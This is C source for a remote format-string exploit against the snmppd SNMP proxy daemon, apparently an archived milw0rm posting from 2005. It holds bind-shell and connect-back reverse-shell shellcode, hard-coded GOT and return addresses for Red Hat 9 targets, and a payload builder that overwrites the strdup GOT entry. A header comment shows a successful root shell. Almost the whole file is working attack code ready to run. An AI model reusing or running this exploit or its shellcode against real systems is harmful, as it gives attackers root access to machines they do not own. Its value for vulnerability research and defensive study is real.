/*
 * Snmppd SNMP proxy daemon format string exploit
 *
 * cybertronic[at]gmx[dot]net 
 *
 * 04/29/2005
 *
 * buffer space is 1024 bytes ( MAX_SNMPPD_OID_LEN defined in snmppd-0.4.5/snmppd.h )
 *
 * Apr 29 16:01:31 ctronic snmppd[6274]: fd 5: Request: XAAAA_804a81e.bfffb9d4.0.0.0.0.35206466.6552203a.73657571.58203a74.41414141
 *
 * This is annoying... there is no fixed input storage.
 * Buffer`s location sometimes varies for 0x980 bytes.
 * Below is a short dump. I highjacked the GOT entry
 * of strdup. Maybe there are some fixed pointers for
 * reliable exploitation. Drop me an email if you have
 * any suggestions
 *
 *
 * __strdup
 *
 * 0xbfffb450:     0x906e6824      0x90909090      0x90909090      0x90909090
 * 0xbfffb460:     0x90909090      0x90909090      0x90909090      0x90909090
 * 0xbfffb470:     0x90909090      0x90909090      0x90909090      0x90909090
 *
 * 0xbfffb3d0:     0x906e6824      0x90909090      0x90909090      0x90909090
 * 0xbfffb3e0:     0x90909090      0x90909090      0x90909090      0x90909090
 * 0xbfffb3f0:     0x90909090      0x90909090      0x90909090      0x90909090
 *
 * 0xbfffb6d0:     0x906e6824      0x90909090      0x90909090      0x90909090
 * 0xbfffb6e0:     0x90909090      0x90909090      0x90909090      0x90909090
 * 0xbfffb6f0:     0x90909090      0x90909090      0x90909090      0x90909090
 *
 * 0xbfffbdd0:     0x906e6824      0x90909090      0x90909090      0x90909090
 * 0xbfffbde0:     0x90909090      0x90909090      0x90909090      0x90909090
 * 0xbfffbdf0:     0x90909090      0x90909090      0x90909090      0x90909090
 *
 * 0xbfffc750:     0x906e6824      0x90909090      0x90909090      0x90909090
 * 0xbfffc760:     0x90909090      0x90909090      0x90909090      0x90909090
 * 0xbfffc770:     0x90909090      0x90909090      0x90909090      0x90909090
 *
 * 0804b1a0 R_386_JUMP_SLOT   malloc
 * 0804b210 R_386_JUMP_SLOT   memset
 * 0804b1fc R_386_JUMP_SLOT   __strdup
 *
 * I succeeded on my third try with the same ret:
 *
 *               __              __                   _
 *   _______  __/ /_  ___  _____/ /__________  ____  (_)____
 *  / ___/ / / / __ \/ _ \/ ___/ __/ ___/ __ \/ __ \/ / ___/
 * / /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__
 * \___/\__, /_.___/\___/_/   \__/_/   \____/_/ /_/_/\___/
 *     /____/
 *                                                                                                            
 * --[ exploit by : cybertronic - cybertronic[at]gmx[dot]net
 * --[ connecting to localhost:164...done!
 * --[ select shellcode
 *      |
 *      |- [0] bind
 *      `- [1] cb
 * >> 0
 * --[ using bind shellcode
 * --[ GOT: 0x0804b1fc
 * --[ RET: 0xbfffc750
 * --[ sending packet [ 1023 bytes ]...done!
 * --[ sleeping 5 seconds before connecting to localhost:20000...
 * --[ connecting to localhost:20000...done!
 * --[ b0x pwned - h4ve phun
 * id
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
 *
 *
 */

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>

#define NOP     0x90

#define RED     "\E[31m\E[1m"
#define GREEN   "\E[32m\E[1m"
#define YELLOW  "\E[33m\E[1m"
#define BLUE    "\E[34m\E[1m"
#define NORMAL  "\E[m"

int connect_to_remote_host ( char* tip, unsigned short tport );
int exploit ( int s, unsigned long smashaddr, unsigned long writeaddr, char* cbip );
int isip ( char *ip );
int shell ( int s, char* tip );
int usage ( char* name );

void start_reverse_handler ( unsigned short cbport );
void connect_to_bindshell ( char* tip, unsigned short bport );
void header ();
void wait ( int sec );

/***********************
 * Linux x86 Shellcode *
 ***********************/

//131 bytes connect back port: 45295
char reverseshell[] =
"\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
"\x06\x51\xb1\x01\x51\xb1\x02\x51"
"\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
"\x89\xc2\x31\xc0\x31\xc9\x51\x51"
"\x68\x41\x42\x43\x44\x66\x68\xb0"
"\xef\xb1\x02\x66\x51\x89\xe7\xb3"
"\x10\x53\x57\x52\x89\xe1\xb3\x03"
"\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
"\x74\x06\x31\xc0\xb0\x01\xcd\x80"
"\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
"\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
"\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
"\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
"\x50\x68\x6e\x2f\x73\x68\x68\x2f"
"\x2f\x62\x69\x89\xe3\x50\x53\x89"
"\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
"\x01\xcd\x80";

//92 bytes bindcode port: 20000
char bindshell[] =
"\x31\xdb"				// xor ebx, ebx
"\xf7\xe3"				// mul ebx
"\xb0\x66"				// mov al, 102
"\x53"					// push ebx
"\x43"					// inc ebx
"\x53"					// push ebx
"\x43"					// inc ebx
"\x53"					// push ebx
"\x89\xe1"				// mov ecx, esp
"\x4b"					// dec ebx
"\xcd\x80"				// int 80h
"\x89\xc7"				// mov edi, eax
"\x52"					// push edx
"\x66\x68\x4e\x20"			// push word 8270
"\x43"					// inc ebx
"\x66\x53"				// push bx
"\x89\xe1"				// mov ecx, esp
"\xb0\xef"				// mov al, 239
"\xf6\xd0"				// not al
"\x50"					// push eax
"\x51"					// push ecx
"\x57"					// push edi
"\x89\xe1"				// mov ecx, esp
"\xb0\x66"				// mov al, 102
"\xcd\x80"				// int 80h
"\xb0\x66"				// mov al, 102
"\x43"					// inc ebx
"\x43"					// inc ebx
"\xcd\x80"				// int 80h
"\x50"					// push eax
"\x50"					// push eax
"\x57"					// push edi
"\x89\xe1"				// mov ecx, esp
"\x43"					// inc ebx
"\xb0\x66"				// mov al, 102
"\xcd\x80"				// int 80h
"\x89\xd9"				// mov ecx, ebx
"\x89\xc3"				// mov ebx, eax
"\xb0\x3f"				// mov al, 63
"\x49"					// dec ecx
"\xcd\x80"				// int 80h
"\x41"					// inc ecx
"\xe2\xf8"				// loop lp
"\x51"					// push ecx
"\x68\x6e\x2f\x73\x68"			// push dword 68732f6eh
"\x68\x2f\x2f\x62\x69"			// push dword 69622f2fh
"\x89\xe3"				// mov ebx, esp
"\x51"					// push ecx
"\x53"					// push ebx
"\x89\xe1"				// mov ecx, esp
"\xb0\xf4"				// mov al, 244
"\xf6\xd0"				// not al
"\xcd\x80";				// int 80h

typedef struct _args {
	char* tip;
	char* lip;
    int tport;
	int target;
} args;

struct targets {
	int  num;
	unsigned long smashaddr;
	unsigned long writeaddr;
	char name[64];
}

target[]= {
	{ 0, 0x0804b1fc, 0xbfffb3d0, "Red hat Linux 9 ( Shrike ) Kernel 2.4.20-8 i686" }, //Red hat Linux release 9 ( Shrike ) Kernel 2.4.20-8 on an i686
	{ 1, 0x0804b1fc, 0xbfffb6d0, "Red hat Linux 9 ( Shrike ) Kernel 2.4.20-8 i686" }, //Red hat Linux release 9 ( Shrike ) Kernel 2.4.20-8 on an i686
	{ 2, 0x0804b1fc, 0xbfffbde0, "Red hat Linux 9 ( Shrike ) Kernel 2.4.20-8 i686" }, //Red hat Linux release 9 ( Shrike ) Kernel 2.4.20-8 on an i686
	{ 3, 0x0804b1fc, 0xbfffc750, "Red hat Linux 9 ( Shrike ) Kernel 2.4.20-8 i686" }, //Red hat Linux release 9 ( Shrike ) Kernel 2.4.20-8 on an i686
	{ 4, 0xdeadc0de, 0xdeadc0de, "description" }, //add more targets if needed
};

int
connect_to_remote_host ( char* tip, unsigned short tport )
{
	int s;
	struct sockaddr_in remote_addr;
	struct hostent* host_addr;

    memset ( &remote_addr, 0x0, sizeof ( remote_addr ) );
    if ( ( host_addr = gethostbyname ( tip ) ) == NULL )
	{
		printf ( "cannot resolve \"%s\"\n", tip );
		exit ( 1 );
	}
    remote_addr.sin_family = AF_INET;
    remote_addr.sin_port = htons ( tport );
    remote_addr.sin_addr = * ( ( struct in_addr * ) host_addr->h_addr );
    if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
    {
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	printf ( "--[ connecting to %s:%u...", tip, tport  );
	if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
	{
		printf ( "failed!\n" );
		exit ( 1 );
	}
	printf ( "done!\n" );
	return ( s );
}

int

exploit ( int s, unsigned long smashaddr, unsigned long writeaddr, char* cbip )
{
	char buffer[1024];
	char a, b, c, d;
	unsigned int low, high;
	unsigned long ulcbip;

	printf ( "--[ GOT: 0x%08x\n", smashaddr );
	printf ( "--[ RET: 0x%08x\n", writeaddr );

	a = ( smashaddr & 0xff000000 ) >> 24;
	b = ( smashaddr & 0x00ff0000 ) >> 16;
	c = ( smashaddr & 0x0000ff00 ) >> 8;
	d = ( smashaddr & 0x000000ff );

	high = ( writeaddr & 0xffff0000 ) >> 16;
	low  = ( writeaddr & 0x0000ffff );

  	bzero ( &buffer, sizeof ( buffer ) );
	if ( high < low )
	{
		sprintf ( buffer,
		"X%c%c%c%c"
		"%c%c%c%c"
		"%%.%uu%%11$hn"
		"%%.%uu%%12$hn",

		d + 2, c, b, a,
		d,     c, b, a,
		high - 24,
		low - high );
	}
	else
	{
		sprintf ( buffer,
		"X%c%c%c%c"
		"%c%c%c%c"
		"%%.%uu%%12$hn"
		"%%.%uu%%11$hn",

		d + 2, c, b, a,
		d,     c, b, a,
		low -24,
		high - low );
	}
  	memset ( buffer + strlen ( buffer ), NOP, sizeof ( buffer ) - strlen ( buffer ) - 3 );
	if ( cbip == NULL )
		memcpy ( buffer + sizeof ( buffer ) - sizeof ( bindshell ) - 3, bindshell, sizeof ( bindshell ) -1 );
	else
	{
		ulcbip = inet_addr ( cbip );
		memcpy ( &reverseshell[33], &ulcbip, 4 );
		memcpy ( buffer + sizeof ( buffer ) - sizeof ( reverseshell ) - 3, reverseshell, sizeof ( reverseshell ) -1 );
	}
	strncat ( buffer, "\r\n", 2 );

	printf ( "--[ sending packet [ %u bytes ]...", strlen ( buffer ) );
	if ( write ( s, buffer, strlen ( buffer ) ) <= 0 )
	{
		printf ( "failed!\n" );
		return ( 1 );
	}
	printf ( "done!\n"  );

	return ( 0 );
}

int
isip ( char *ip )
{
	int a, b, c, d;

	if ( !sscanf ( ip, "%d.%d.%d.%d", &a, &b, &c, &d ) )
		return ( 0 );
	if ( a < 1 )
		return ( 0 );
	if ( a > 255 )
		return 0;
	if ( b < 0 )
		return 0;
	if ( b > 255 )
		return 0;
	if ( c < 0 )
		return 0;
	if ( c > 255 )
		return 0;
	if ( d < 0 )
		return 0;
	if ( d > 255 )
		return 0;
	return 1;
}

int
shell ( int s, char* tip )
{
	int n;
	char buffer[2048];
	fd_set fd_read;

	printf ( "--[" YELLOW " b" NORMAL "0" YELLOW "x " NORMAL "p" YELLOW "w" NORMAL "n" YELLOW "e" NORMAL "d " YELLOW "- " NORMAL "h" YELLOW "4" NORMAL "v" YELLOW "e " NORMAL "p" YELLOW "h" NORMAL "u" YELLOW "n" NORMAL "\n" );

	FD_ZERO ( &fd_read );
	FD_SET ( s, &fd_read );
	FD_SET ( 0, &fd_read );

	while ( 1 )
	{
		FD_SET ( s, &fd_read );
		FD_SET ( 0, &fd_read );

		if ( select ( s + 1, &fd_read, NULL, NULL, NULL ) < 0 )
			break;
		if ( FD_ISSET ( s, &fd_read ) )
		{
			if ( ( n = recv ( s, buffer, sizeof ( buffer ), 0 ) ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
			if ( write ( 1, buffer, n ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
		}
		if ( FD_ISSET ( 0, &fd_read ) )
		{
			if ( ( n = read ( 0, buffer, sizeof ( buffer ) ) ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
			if ( send ( s, buffer, n, 0 ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
		}
		usleep(10);
	}
}

int
usage ( char* name )
{
	int i;

	printf ( "\n" );
	printf ( "Note: all switches have to be specified!\n" );
	printf ( "You can choose between bind and cb shellcode later!\n" );
	printf ( "\n" );
	printf ( "Usage: %s -h <tip> -p <tport> -l <cbip> -t <target>\n", name );
  	printf ( "\n" );
	printf ( "Targets\n\n" );
	for ( i = 0; i < 5; i++ )
		printf ( "\t[%d] [0x%08x] [0x%08x] [%s]\n", target[i].num, target[i].smashaddr, target[i].writeaddr, target[i].name );
	printf ( "\n" );
    exit ( 1 );
}

void
connect_to_bindshell ( char* tip, unsigned short bport )
{
	int s;
	int sec = 5; // change this for fast targets
	struct sockaddr_in remote_addr;
	struct hostent *host_addr;

	if ( ( host_addr = gethostbyname ( tip ) ) == NULL )
	{
		fprintf ( stderr, "cannot resolve \"%s\"\n", tip );
		exit ( 1 );
	}

	remote_addr.sin_family = AF_INET;
	remote_addr.sin_addr   = * ( ( struct in_addr * ) host_addr->h_addr );
	remote_addr.sin_port   = htons ( bport );

	if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
    {
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	printf ("--[ sleeping %d seconds before connecting to %s:%u...\n", sec, tip, bport );
	wait ( sec );
	printf ( "--[ connecting to %s:%u...", tip, bport );
	if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
	{
		printf ( RED "failed!\n" NORMAL);
		exit ( 1 );
	}
	printf ( YELLOW "done!\n" NORMAL);
	shell ( s, tip );
}

void
header ()
{
	printf ( "              __              __                   _           \n" );
	printf ( "  _______  __/ /_  ___  _____/ /__________  ____  (_)____      \n" );
	printf ( " / ___/ / / / __ \\/ _ \\/ ___/ __/ ___/ __ \\/ __ \\/ / ___/  \n" );
	printf ( "/ /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__        \n" );
	printf ( "\\___/\\__, /_.___/\\___/_/   \\__/_/   \\____/_/ /_/_/\\___/  \n" );
	printf ( "    /____/                                                     \n\n" );
	printf ( "--[ exploit by : cybertronic - cybertronic[at]gmx[dot]net\n" );
}

void
parse_arguments ( int argc, char* argv[], args* argp )
{
	int i = 0;

	while ( ( i = getopt ( argc, argv, "h:p:l:t:" ) ) != -1 )
	{
		switch ( i )
		{
			case 'h':
				argp->tip = optarg;
				break;
			case 'p':
				argp->tport = atoi ( optarg );
				break;
			case 'l':
				argp->lip = optarg;
				break;
			case 't':
                argp->target = strtoul ( optarg, NULL, 16 );
	            break;
			case ':':
			case '?':
			default:
				usage ( argv[0] );
	    }
    }

    if ( argp->tip == NULL || argp->tport < 1 || argp->tport > 65535 || argp->lip == NULL ||  argp->target < 0 || argp->target > 4 )
		usage ( argv[0] );
}

void
start_reverse_handler ( unsigned short cbport )
{
	int s1, s2;
	struct sockaddr_in cliaddr, servaddr;
	socklen_t clilen = sizeof ( cliaddr );

	bzero ( &servaddr, sizeof ( servaddr ) );
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
	servaddr.sin_port = htons ( cbport );

	printf ( "--[ starting reverse handler [port: %u]...", cbport );
	if ( ( s1 = socket ( AF_INET, SOCK_STREAM, 0 ) ) == -1 )
	{
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	bind ( s1, ( struct sockaddr * ) &servaddr, sizeof ( servaddr ) );
	if ( listen ( s1, 1 ) == -1 )
	{
		printf ( "listen failed!\n" );
		exit ( 1 );
	}
	printf ( "done!\n" );
	if ( ( s2 = accept ( s1, ( struct sockaddr * ) &cliaddr, &clilen ) ) < 0 )
	{
		printf ( "accept failed!\n" );
		exit ( 1 );
	}
	close ( s1 );
	printf ( "--[ incomming connection from:\t%s\n", inet_ntoa ( cliaddr.sin_addr ) );
	shell ( s2, ( char* ) inet_ntoa ( cliaddr.sin_addr ) );
	close ( s2 );
}

void
wait ( int sec )
{
	sleep ( sec );
}

int
main ( int argc, char* argv[] )
{
	int s, option;
	args myargs;

	system ( "clear" );
	header ();
	parse_arguments ( argc, argv, &myargs );
	s = connect_to_remote_host ( myargs.tip, myargs.tport );

	printf ( "--[ select shellcode\n" );
	printf ( "     |\n" );
	printf ( "     |- [0] bind\n" );
	printf ( "     `- [1] cb\n" );
	printf ( ">> " );
	scanf ( "%d", &option );
	switch ( option )
		{
			case 0:
				printf ( "--[ using bind shellcode\n" );
				if ( exploit ( s, target[myargs.target].smashaddr, target[myargs.target].writeaddr, NULL ) == 1 )
				{
					printf ( "exploitation failed!\n" );
					exit ( 1 );
				}
				connect_to_bindshell ( myargs.tip, 20000 );
				break;
			case 1:
				printf ( "--[ using cb shellcode\n" );
				if ( exploit ( s, target[myargs.target].smashaddr, target[myargs.target].writeaddr, myargs.lip ) == 1 )
				{
					printf ( "exploitation failed!\n" );
					exit ( 1 );
				}
				start_reverse_handler ( 45295 );
				break;
			default:
				printf ( "--[ invalid shellcode!\n" ); exit ( 1 );
	    }
	close ( s );
	return 0;
}

// milw0rm.com [2005-04-29]
